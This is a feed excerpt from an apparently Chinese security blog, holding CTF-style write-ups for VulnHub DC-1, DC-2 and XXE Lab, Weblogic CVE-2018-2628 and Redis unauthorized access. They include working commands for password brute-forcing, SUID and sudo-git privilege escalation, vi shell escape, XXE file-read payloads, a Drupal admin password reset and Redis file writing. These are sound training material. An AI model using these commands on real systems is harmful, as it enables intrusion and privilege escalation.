&lt;h1 id=&quot;目标&quot;&gt;&lt;a href=&quot;#目标&quot; class=&quot;headerlink&quot; title=&quot;目标&quot;&gt;&lt;/a&gt;目标&lt;/h1&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="vulnhub" scheme="https://syst1m.top/tags/vulnhub/"/>
    
    <category term="红队" scheme="https://syst1m.top/tags/%E7%BA%A2%E9%98%9F/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub-dc2打靶</title>
    <link href="https://syst1m.top/2022/06/07/vulnhub-dc2%E6%89%93%E9%9D%B6/"/>
    <id>https://syst1m.top/2022/06/07/vulnhub-dc2%E6%89%93%E9%9D%B6/</id>
    <published>2022-06-07T11:35:24.000Z</published>
    <updated>2022-06-07T13:31:17.115Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>vulnhub环境,项目地址<a href="https://www.vulnhub.com/entry/dc-2,311/">https://www.vulnhub.com/entry/dc-2,311/</a><br>靶机:172.16.17.143<br>攻击机kali:172.16.17.140</p><h1 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h1><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206071953622.png"></p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>找到靶机ip<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206071939781.png"><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206072051340.png"></p><p>打开跳转dc-2&#x2F;,502<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206071940839.png"></p><p>抓包发现301永久跳转一个页面<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206071952711.png"></p><p>添加一个解析<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206072000538.png"><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206072000379.png"><br>拿到第一个flag,提示我们使用cewl来生成密码</p><h1 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h1><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206072012702.png"><br>cewl使用 <a href="https://www.freebuf.com/articles/network/190128.html">https://www.freebuf.com/articles/network/190128.html</a></p><p>使用cewl生成字典<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206072018340.png"></p><p>需要扫出登录点<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206072035043.png"><br>经典wordpress</p><p>掏出wpscan,枚举用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url  http://dc-2 -e u</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206072041502.png"></p><p>将用户名写入txt,开始爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url  http://dc-2 -U name.txt -P pwd.txt</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206072044253.png"></p><p>登录jerry账号发现flag2<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206072047333.png"><br>flag提示,如果wp没法利用就找别的方法,想到刚刚信息收集还有ssh,用这两个账号去试试</p><p>msf爆破ssh<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206072057740.png"><br>最后使用tom用户成功登录</p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>尝试之后发现权限很低,使用vi查看内容<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206072100660.png"><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206072059691.png"><br>得到提示,尝试su,发现没有这个命令,查看一下当前用户的环境变量<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206072103628.png"></p><p>使用vi尝试绕过,得到一个正常环境变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">vi a.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">#设置shell变量</span></span><br><span class="line">:shell = /bin/bash</span><br><span class="line"></span><br><span class="line"><span class="comment">#启动shell</span></span><br><span class="line">:shell</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入环境变量</span></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/bin</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206072116628.png"></p><p>登录jerry,使用刚刚爆破出的密码,得到flag4.txt,没有提示<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206072120697.png"></p><p>查看历史命令,发现有使用sudo git,也就是说git是有root权限的<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206072129726.png"></p><p>git提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo git <span class="built_in">help</span> add</span><br><span class="line">末尾输入!/bin/bash</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line">sudo git <span class="built_in">help</span> config</span><br><span class="line">末尾输入</span><br><span class="line">!<span class="string">&#x27;sh&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206072127120.png"><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206072128530.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;p&gt;vulnhub环境,项目地址&lt;a href=&quot;https://www.vulnhub.com/entry/dc-2,311/&quot;&gt;https://www.vulnhub.com/entry/dc-2,311/&lt;/a&gt;&lt;br&gt;靶机:172.16.17.143&lt;br&gt;攻击机kali:172.16.17.140&lt;/p&gt;
&lt;h1 id=&quot;目标&quot;&gt;&lt;a href=&quot;#目标&quot; class=&quot;headerlink&quot; title=&quot;目标&quot;&gt;&lt;/a&gt;目标&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202206071953622.png&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="vulnhub" scheme="https://syst1m.top/tags/vulnhub/"/>
    
  </entry>
  
  <entry>
    <title>vulbhub-dc1打靶</title>
    <link href="https://syst1m.top/2022/06/07/vulnhub-dc1%E6%89%93%E9%9D%B6/"/>
    <id>https://syst1m.top/2022/06/07/vulnhub-dc1%E6%89%93%E9%9D%B6/</id>
    <published>2022-06-07T04:02:08.000Z</published>
    <updated>2022-06-07T06:38:09.170Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>vulnhub靶场,项目地址:<a href="https://www.vulnhub.com/entry/dc-1,292/">https://www.vulnhub.com/entry/dc-1,292/</a><br>靶机:172.16.17.142<br>攻击机:172.16.17.140<br>网络模式:net</p><h1 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h1><p>找到5个flag<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206071210943.png"></p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><ul><li><p>nmap扫描找目标ip<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206071206991.png"></p></li><li><p>访问web<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206071208399.png"><br>收集到web指纹,和cms指纹</p></li></ul><h1 id="exp利用"><a href="#exp利用" class="headerlink" title="exp利用"></a>exp利用</h1><p>google找到cms有nday(cve-2018-7600),进kali找exp打<br>  <img src="https://raw.githubusercontent.com/chencicici/images/main/202206071212266.png"><br>  返弹一个meterpreter shell,但是权限很低</p><h1 id="找flag"><a href="#找flag" class="headerlink" title="找flag"></a>找flag</h1><ul><li>第一个flag<br>用python反弹一个交互式shell</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/sh&quot;)&#x27;</span></span><br><span class="line">python ‐c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206071217200.png"></p><p>拿到提示信息 (每个好的 CMS 都需要一个配置文件——你也一样。)<br>百度找配置文件路径,写一个一句话上去用蚁剑连,方便一点<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206071240945.png"></p><p>在此配置文件下找到mysql连接账号密码<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206071242424.png"></p><p>要注意的是,这里的mysql不出网,只能通过msf反弹的shell去连接<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206071252501.png"></p><p>拿到网站后台账号密码,但是解密不出<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206071303091.png"></p><p>继续往下翻数据库</p><ul><li>flag3的线索<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206071257889.png"></li></ul><p>到此，我们看到了flag3到底在哪里了(uid为1的用户是不受Drupal权限管制的，具有最高权限。)现在我们有两个思路：</p><ol><li><p>重置管理员密码<br>可能是环境原因,我在加密密码的时候报错<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206071311553.png"><br>网上找了一个加密好的</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">明文：password</span><br><span class="line">密文：<span class="variable">$S</span><span class="variable">$CDbdwZvjHQ09IVRs88G0fnaxPr50</span><span class="regexp">/kb81YI9.8M/</span>D9okW7J/s5U4</span><br></pre></td></tr></table></figure><p>写入表中替换原来的密码<br> <img src="https://raw.githubusercontent.com/chencicici/images/main/202206071315494.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update drupaldb.users set pass=&quot;$S$CDbdwZvjHQ09IVRs88G0fnaxPr50/kb81YI9.8M/D9okW7J/s5U4&quot; where uid=1;  </span><br></pre></td></tr></table></figure><p>登录<br> <img src="https://raw.githubusercontent.com/chencicici/images/main/202206071317471.png"><br>找到flag3得到提示<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206071319974.png"><br>(特殊的PERMS将帮助您找到passwd，但您需要执行该命令来确定如何获取阴影中的内容。)</p></li><li><p>利用exp添加用户</p><p> 首先要查看cms具体版本<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206071327767.png"></p><p> 使用searchsploit找exp<br> <img src="https://raw.githubusercontent.com/chencicici/images/main/202206071328915.png"></p><p> 需要使用python2去运行,之后会创建一个test的用户<br> <img src="https://raw.githubusercontent.com/chencicici/images/main/202206071335890.png"><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206071336865.png"></p></li></ol><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>根据flag3的提示,去寻找线索<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206071341447.png"><br>发现flag4 在home目录下<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206071342274.png"><br>拿到flag4的提示<br>(是否可以使用相同的方法在root目录下找到最终flag)</p><p>根据提示,想到使用suid提权,查询root权限的命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000</span><br><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -<span class="built_in">exec</span> <span class="built_in">ls</span> -ldb &#123;&#125; ;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206071349039.png"></p><p>可以看到find本身就是root权限</p><p>使用find提权,要注意的是-name后的文件必须存在</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find ./ -name flag4.txt -<span class="built_in">exec</span> <span class="string">&#x27;/bin/sh&#x27;</span> \;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206071355907.png"><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206071357520.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;p&gt;vulnhub靶场,项目地址:&lt;a href=&quot;https://www.vulnhub.com/entry/dc-1,292/&quot;&gt;https://www.vulnhub.com/entry/dc-1,292/&lt;/a&gt;&lt;br&gt;靶机:172.16.17.142&lt;br&gt;攻击机:172.16.17.140&lt;br&gt;网络模式:net&lt;/p&gt;
&lt;h1 id=&quot;目标&quot;&gt;&lt;a href=&quot;#目标&quot; class=&quot;headerlink&quot; title=&quot;目标&quot;&gt;&lt;/a&gt;目标&lt;/h1&gt;&lt;p&gt;找到5个flag&lt;br&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202206071210943.png&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="vulnhub" scheme="https://syst1m.top/tags/vulnhub/"/>
    
    <category term="drupal7" scheme="https://syst1m.top/tags/drupal7/"/>
    
    <category term="提权" scheme="https://syst1m.top/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>Weblogic WLS CoreComponents反序列化漏洞复现</title>
    <link href="https://syst1m.top/2022/06/04/WeblogicWLSCoreComponents%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>https://syst1m.top/2022/06/04/WeblogicWLSCoreComponents%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2022-06-04T04:11:18.000Z</published>
    <updated>2022-06-12T09:09:03.574Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞解析"><a href="#漏洞解析" class="headerlink" title="漏洞解析"></a>漏洞解析</h1><p>Weblogic WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628）<br>Oracle 2018年4月补丁中，修复了Weblogic Server WLS Core Components中出现的一个反序列化漏洞（CVE-2018-2628），该漏洞通过t3协议触发，可导致未授权的用户在远程服务器执行任意命令。</p><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>vulhub环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> CVE-2018-2628  </span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><p>使用工具检测<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206041231208.png"><br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206041231652.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;漏洞解析&quot;&gt;&lt;a href=&quot;#漏洞解析&quot; class=&quot;headerlink&quot; title=&quot;漏洞解析&quot;&gt;&lt;/a&gt;漏洞解析&lt;/h1&gt;&lt;p&gt;Weblogic WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628）&lt;br&gt;Oracle 2018年4月补丁中，修复了Weblogic Server WLS Core Components中出现的一个反序列化漏洞（CVE-2018-2628），该漏洞通过t3协议触发，可导致未授权的用户在远程服务器执行任意命令。&lt;/p&gt;
&lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;p&gt;vulhub环境&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;cd&lt;/span&gt; CVE-2018-2628  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;docker-compose up -d&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="漏洞复现" scheme="https://syst1m.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="反序列化" scheme="https://syst1m.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="Weblogic" scheme="https://syst1m.top/tags/Weblogic/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub-XXE Lab:1</title>
    <link href="https://syst1m.top/2022/06/03/vulnhub-XXELab-1/"/>
    <id>https://syst1m.top/2022/06/03/vulnhub-XXELab-1/</id>
    <published>2022-06-03T10:39:16.000Z</published>
    <updated>2022-06-07T04:02:17.595Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>项目地址:<a href="https://www.vulnhub.com/entry/xxe-lab-1,254/">https://www.vulnhub.com/entry/xxe-lab-1,254/</a><br>攻击机 kali:172.16.17.140<br>靶机:172.16.17.141</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>nmap扫一下,只开了80端口应该是这个<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206032004003.png"></p><p>详细扫描<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206032008378.png"></p><p>robots.txt存在两个禁止爬取的目录<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206032009689.png"></p><p>admin.php无法访问<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206032010229.png"></p><p>XXE目录直接跳转到一个登录页面<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206032011673.png"></p><p>扫描一下目录<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206032016456.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206032017129.png"></p><p>扫出来的目录都在xxe下面</p><h1 id="fuzz"><a href="#fuzz" class="headerlink" title="fuzz"></a>fuzz</h1><p>对功能点进行测试 &#x2F;xxe<br>xxe,登录点抓包<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206032020685.png"><br>使用xml传递数据,结合靶场名字,此处应该存在xml实体注入</p><h2 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206032024438.png"><br>存在xml注入漏洞,但是通过需要找到flag</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; ?&gt;</span> <span class="meta">&lt;!DOCTYPE r </span></span><br><span class="line"><span class="meta">        [ <span class="meta">&lt;!ELEMENT r <span class="keyword">ANY</span> &gt;</span> <span class="meta">&lt;!ENTITY <span class="keyword">sp</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">                ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;sp;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>hj<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>构造伪协议读取&#x2F;admin.php<br>base64编码防止php代码被执行<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; ?&gt;</span> <span class="meta">&lt;!DOCTYPE r [ </span></span><br><span class="line"><span class="meta">        <span class="meta">&lt;!ELEMENT r <span class="keyword">ANY</span> &gt;</span> <span class="meta">&lt;!ENTITY <span class="keyword">sp</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=admin.php&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">        ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;sp;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>hj<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/chencicici/images/main/202206032030915.png"></li></ul><h2 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h2><ul><li><p>base64解码<br>读取到账号密码<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206032031373.png"></p></li><li><p>登录<br>密码是md5加密,解密出来<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206032034930.png"></p></li></ul><p>发现无法登录<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206032037275.png"></p><p>继续查看admin.php源码发现还有一个路径,flag this here<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206032038786.png"></p><p>访问,存在文件但是无任何回显<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206032039056.png"></p><h2 id="绕来绕去的解码"><a href="#绕来绕去的解码" class="headerlink" title="绕来绕去的解码"></a>绕来绕去的解码</h2><p>用上面的payload读取源码<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206032042053.png"></p><p>解码出来,flag在这里,明显又是编码过的<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206032043496.png"></p><p>密文32位,猜测是base32<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206032045190.png"></p><p>又是编码过的,看到&#x3D;直接丢base64,一个小技巧,base64末尾有&#x3D;,base32没有<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206032047754.png"></p><p>这个文件应该是flag了,用上面的payload读取<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206032049966.png"></p><p>再解码<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206032050649.png"></p><p>看到<code>$</code>,猜测为php代码混淆过后的,拿去运行<br>最后在运行报错中找到flag<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206032055796.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;p&gt;项目地址:&lt;a href=&quot;https://www.vulnhub.com/entry/xxe-lab-1,254/&quot;&gt;https://www.vulnhub.com/entry/xxe-lab-1,254/&lt;/a&gt;&lt;br&gt;攻击机 kali:172.16.17.140&lt;br&gt;靶机:172.16.17.141&lt;/p&gt;
&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;&lt;p&gt;nmap扫一下,只开了80端口应该是这个&lt;br&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202206032004003.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;详细扫描&lt;br&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202206032008378.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="vulnhub" scheme="https://syst1m.top/tags/vulnhub/"/>
    
    <category term="XXE" scheme="https://syst1m.top/tags/XXE/"/>
    
  </entry>
  
  <entry>
    <title>redis未授权访问利用</title>
    <link href="https://syst1m.top/2022/06/02/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8/"/>
    <id>https://syst1m.top/2022/06/02/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8/</id>
    <published>2022-06-02T08:02:16.000Z</published>
    <updated>2022-06-02T13:07:30.332Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞解析"><a href="#漏洞解析" class="headerlink" title="漏洞解析"></a>漏洞解析</h1><p>Redis未授权访问在4.x&#x2F;5.0.5以前版本下，我们可以使用master&#x2F;slave模式加载远程模块，通过动态链接库的方式执行任意命令。</p><h1 id="利用前提"><a href="#利用前提" class="headerlink" title="利用前提"></a>利用前提</h1><p>redis直接暴露在外网,无访问限制<br>没有设置密码认证（一般为空），可以免密码远程登录redis服务。</p><h1 id="靶场环境"><a href="#靶场环境" class="headerlink" title="靶场环境"></a>靶场环境</h1><p>使用vulhub环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> redis/4-unacc </span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="下载连接客户端"><a href="#下载连接客户端" class="headerlink" title="下载连接客户端"></a>下载连接客户端</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget http://download.redis.io/redis-stable.tar.gz</span><br><span class="line">tar -zxvf redis-stable.tar.gz</span><br><span class="line"><span class="built_in">cd</span> redis-stable </span><br><span class="line">make </span><br><span class="line"><span class="built_in">cp</span> src/redis-cli /usr/bin/</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206021617001.png"></p><h2 id="redis命令"><a href="#redis命令" class="headerlink" title="redis命令"></a>redis命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">使用密码连接reids</span><br><span class="line">redis-cli -h ip -p port -a password</span><br><span class="line"></span><br><span class="line">无密码连接redis</span><br><span class="line">redis-cli -h ip</span><br><span class="line"></span><br><span class="line">测试连通性</span><br><span class="line">ping</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206021622678.png"></p><h2 id="写webshell"><a href="#写webshell" class="headerlink" title="写webshell"></a>写webshell</h2><p>利用条件</p><ul><li>知道真实路径</li><li>读写权限</li></ul><p>因为靶场没有web服务,写入tmp目录下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">10.20.146.195:6379&gt; config set dir /tmp #设置绝对路径</span><br><span class="line">OK</span><br><span class="line">10.20.146.195:6379&gt; config set dbfilename shell.php #写入文件名</span><br><span class="line">OK</span><br><span class="line">10.20.146.195:6379&gt; set shell &quot;\r\n\r\n&lt;?php phpinfo()?&gt;\r\n&quot; #写入数据</span><br><span class="line">OK</span><br><span class="line">10.20.146.195:6379&gt; save #保存</span><br><span class="line">OK</span><br></pre></td></tr></table></figure><p>CONFIG 命令查看或设置配置项<br>dbfilename 备份文件</p><p>\n\r\n为换行符,在写入的时候redis会自动写入其他数据,避免代码无法正常执行<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202206021643250.png"></p><h2 id="写入公钥"><a href="#写入公钥" class="headerlink" title="写入公钥"></a>写入公钥</h2><p>靶机上没有ssh,先安装,再生成公私秘钥</p><figure class="highlight 